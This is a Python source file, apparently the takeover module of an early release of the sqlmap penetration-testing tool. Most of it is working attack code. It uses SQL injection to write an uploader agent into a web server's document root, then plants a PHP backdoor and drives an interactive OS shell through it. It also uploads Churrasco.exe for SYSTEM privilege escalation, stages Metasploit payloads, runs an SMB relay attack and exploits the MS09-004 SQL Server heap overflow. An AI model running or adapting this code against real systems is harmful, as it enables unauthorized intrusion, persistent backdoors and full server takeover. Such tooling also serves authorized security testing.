#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import os
import re

from lib.core.agent import agent
from lib.core.common import fileToStr
from lib.core.common import getDirs
from lib.core.common import getDocRoot
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.shell import autoCompletion
from lib.request.connect import Connect as Request
from lib.takeover.abstraction import Abstraction
from lib.takeover.dep import DEP
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry
from lib.techniques.outband.stacked import stackedTest


class Takeover(Abstraction, DEP, Metasploit, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName       = "sqlmapoutput"
        self.tblField         = "data"
        self.cmdFromChurrasco = False

        Abstraction.__init__(self)
        DEP.__init__(self)


    def __webBackdoorRunCmd(self, backdoorUrl, cmd):
        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl  = "%s?cmd=%s" % (backdoorUrl, cmd)
        page, _ = Request.getPage(url=cmdUrl, direct=True)
        output  = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

        if output:
            print output.group(1)
        else:
            print "No output"

        return output


    def __webBackdoorShell(self, backdoorUrl):
        infoMsg  = "calling OS shell. To quit type "
        infoMsg += "'x' or 'q' and press ENTER"
        logger.info(infoMsg)

        autoCompletion(osShell=True)

        while True:
            command = None

            try:
                command = raw_input("os-shell> ")
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ( "x", "q", "exit", "quit" ):
                break

            self.__webBackdoorRunCmd(backdoorUrl, command)


    def __webBackdoorInit(self):
        """
        This method is used to write a PHP agent (cmd.php) on a writable
        remote directory within the web server document root.
        Such agent is written using the INTO OUTFILE MySQL DBMS
        functionality
        """

        self.checkDbmsOs()

        backdoorUrl = None
        kb.docRoot  = getDocRoot()
        directories = getDirs()
        directories = list(directories)
        directories.sort()

        infoMsg = "trying to upload the uploader agent"
        logger.info(infoMsg)

        # TODO: backdoor and uploader extensions must be the same as of
        # the web application language in use
        backdoorName = "backdoor.php"
        backdoorPath = "%s/%s" % (paths.SQLMAP_SHELL_PATH, backdoorName)
        uploaderName = "uploader.php"
        uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))

        if kb.os == "Windows":
            sep = "\\\\"
        else:
            sep = "/"

        for directory in directories:
            # Upload the uploader agent
            outFile     = os.path.normpath("%s%s%s" % (directory, sep, uploaderName))
            uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
            query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
            query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
            query       = agent.prefixQuery(" %s" % query)
            query       = agent.postfixQuery(query)
            payload     = agent.payload(newValue=query)
            page        = Request.queryPage(payload)

            requestDir  = os.path.normpath(directory.replace(kb.docRoot, "/").replace("\\", "/"))
            baseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
            uplPage, _  = Request.getPage(url=uploaderUrl, direct=True)

            if "sqlmap backdoor uploader" not in uplPage:
                warnMsg  = "unable to upload the uploader "
                warnMsg += "agent on '%s'" % directory
                logger.warn(warnMsg)

                continue

            infoMsg  = "the uploader agent has been successfully uploaded "
            infoMsg += "on '%s'" % directory
            logger.info(infoMsg)

            # Upload the backdoor through the uploader agent
            multipartParams = {
                                "upload":    "1",
                                "file":      open(backdoorPath, "r"),
                                "uploadDir": directory,
                              }
            page = Request.getPage(url=uploaderUrl, multipart=multipartParams)

            if "Backdoor uploaded" not in page:
                warnMsg  = "unable to upload the backdoor through "
                warnMsg += "the uploader agent on '%s'" % directory
                logger.warn(warnMsg)

                continue

            backdoorUrl = "%s/%s" % (baseUrl, backdoorName)

            infoMsg  = "the backdoor has been successfully uploaded on "
            infoMsg += "'%s', go with your browser to " % directory
            infoMsg += "'%s' and enjoy it!" % backdoorUrl
            logger.info(infoMsg)

            break

        return backdoorUrl


    def uploadChurrasco(self):
        msg  = "do you want sqlmap to upload Churrasco and call the "
        msg += "Metasploit payload stager as its argument so that it "
        msg += "will be started as SYSTEM? [Y/n] "

        output = readInput(msg, default="Y")

        if not output or output[0] in ( "y", "Y" ):
            # TODO: add also compiled/packed Churrasco for Windows 2008
            wFile = "%s/tokenkidnapping/Churrasco.exe" % paths.SQLMAP_CONTRIB_PATH

            self.churrascoPath    = "%s/sqlmapchur%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
            self.cmdFromChurrasco = True

            # NOTE: no need to handle DEP for Churrasco executable because
            # it spawns a new process as the SYSTEM user token to execute
            # the executable passed as argument
            self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)

            return True
        else:
            return False


    def osCmd(self):
        stackedTest()

        if kb.stackedTest == False:
            infoMsg  = "going to upload a web page backdoor for command "
            infoMsg += "execution"
            logger.info(infoMsg)

            backdoorUrl = self.__webBackdoorInit()

            if backdoorUrl:
                self.__webBackdoorRunCmd(backdoorUrl, conf.osCmd)
        else:
            self.initEnv()
            self.runCmd(conf.osCmd)


    def osShell(self):
        stackedTest()

        if kb.stackedTest == False:
            infoMsg  = "going to upload a web page backdoor for command "
            infoMsg += "execution"
            logger.info(infoMsg)

            backdoorUrl = self.__webBackdoorInit()

            if backdoorUrl:
                self.__webBackdoorShell(backdoorUrl)
        else:
            self.initEnv()
            self.absOsShell()


    def osPwn(self):
        stackedTest()

        if kb.stackedTest == False:
            return

        self.initEnv()
        self.getRemoteTempPath()
        self.createMsfPayloadStager()
        self.uploadMsfPayloadStager()

        if kb.os == "Windows":
            # NOTE: no need to add an exception to DEP for the payload
            # stager because it already sets the memory to +rwx before
            # copying the shellcode into that memory page
            #self.handleDep(self.exeFilePathRemote)

            if conf.privEsc and kb.dbms == "MySQL":
                debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                debugMsg += "user, no need to privilege escalate"
                logger.debug(debugMsg)

            elif conf.privEsc and kb.dbms == "PostgreSQL":
                warnMsg  = "by default PostgreSQL on Windows runs as postgres "
                warnMsg += "user which has no Windows Impersonation "
                warnMsg += "Tokens: it is unlikely that the privilege "
                warnMsg += "escalation will be successful"
                logger.warn(warnMsg)

            elif conf.privEsc and kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                warnMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
                warnMsg += "runs as Network Service which has no Windows "
                warnMsg += "Impersonation Tokens within all threads, this "
                warnMsg += "makes Meterpreter's incognito extension to "
                warnMsg += "fail to list tokens"
                logger.warn(warnMsg)

                uploaded = self.uploadChurrasco()

                if uploaded == False:
                    warnMsg  = "beware that the privilege escalation "
                    warnMsg += "might not work"
                    logger.warn(warnMsg)

        else:
            # Unset --priv-esc if the back-end DBMS underlying operating
            # system is not Windows
            conf.privEsc = False

        self.pwn()


    def osSmb(self):
        stackedTest()

        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows: it is not possible to perform the SMB "
            errMsg += "relay attack"
            raise sqlmapUnsupportedDBMSException, errMsg

        if kb.stackedTest == False:
            if kb.dbms in ( "PostgreSQL", "Microsoft SQL Server" ):
                errMsg  = "on this back-end DBMS it is only possible to "
                errMsg += "perform the SMB relay attack if stacked "
                errMsg += "queries are supported"
                raise sqlmapUnsupportedDBMSException, errMsg

            elif kb.dbms == "MySQL":
                debugMsg  = "since stacked queries are not supported, "
                debugMsg += "sqlmap is going to perform the SMB relay "
                debugMsg += "attack via inference blind SQL injection"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg   = "it is unlikely that this attack will be successful "

        if kb.dbms == "MySQL":
            warnMsg += "because by default MySQL on Windows runs as "
            warnMsg += "Local System which is not a real user, it does "
            warnMsg += "not send the NTLM session hash when connecting to "
            warnMsg += "a SMB service"

        elif kb.dbms == "PostgreSQL":
            warnMsg += "because by default PostgreSQL on Windows runs "
            warnMsg += "as postgres user which is a real user of the "
            warnMsg += "system, but not within the Administrators group"

        elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
            warnMsg += "because often Microsoft SQL Server %s " % kb.dbmsVersion[0]
            warnMsg += "runs as Network Service which is not a real user, "
            warnMsg += "it does not send the NTLM session hash when "
            warnMsg += "connecting to a SMB service"

        else:
            printWarn = False

        if printWarn == True:
            logger.warn(warnMsg)

        self.smb()


    def osBof(self):
        stackedTest()

        if kb.stackedTest == False:
            return

        if not kb.dbms == "Microsoft SQL Server" or kb.dbmsVersion[0] not in ( "2000", "2005" ):
            errMsg  = "the back-end DBMS must be Microsoft SQL Server "
            errMsg += "2000 or 2005 to be able to exploit the heap-based "
            errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
            errMsg += "stored procedure (MS09-004)"
            raise sqlmapUnsupportedDBMSException, errMsg

        infoMsg  = "going to exploit the Microsoft SQL Server %s " % kb.dbmsVersion[0]
        infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
        infoMsg += "buffer overflow (MS09-004)"
        logger.info(infoMsg)

        # NOTE: only needed to handle DEP
        self.initEnv(mandatory=False, detailed=True)

        self.getRemoteTempPath()
        self.createMsfShellcode()
        self.overflowBypassDEP()
        self.bof()
        self.delException()
